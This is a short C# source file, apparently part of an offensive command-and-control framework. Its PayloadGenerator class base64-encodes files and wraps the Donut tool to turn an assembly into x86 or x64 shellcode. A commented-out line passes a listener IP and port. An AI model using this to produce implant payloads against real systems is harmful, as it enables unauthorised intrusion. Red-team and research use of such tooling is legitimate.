using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Common.Payload
{
    public partial class PayloadGenerator
    {
        public string GenerateB64(string sourceFile)
        {
            byte[] bytes = File.ReadAllBytes(sourceFile);
            string base64 = Convert.ToBase64String(bytes);
            return base64;
        }

        public ExecuteResult GenerateBin(string inputPath, string outFile, bool x86, string dotNetParams = null)
        {
            var cmd = this.Config.DonutPath;

            List<string> args = new List<string>();
            args.Add(inputPath);
            args.Add("-f 1");
            if (x86)
                args.Add("-a 1");
            else
                args.Add("-a 2");
            args.Add($"-o");
            args.Add(outFile);
            if (!string.IsNullOrEmpty(dotNetParams))
            {
                args.Add($"-p");
                args.Add(dotNetParams);
            }

            //string args = $"'{inputFile}' -f 1 -a 2 -o '{outFile}' -p '{listener.Ip}:{listener.BindPort}'";
            var ret = ExecuteCommand(cmd, args, this.Config.WorkingFolder);
            return ret;
        }
    }
}
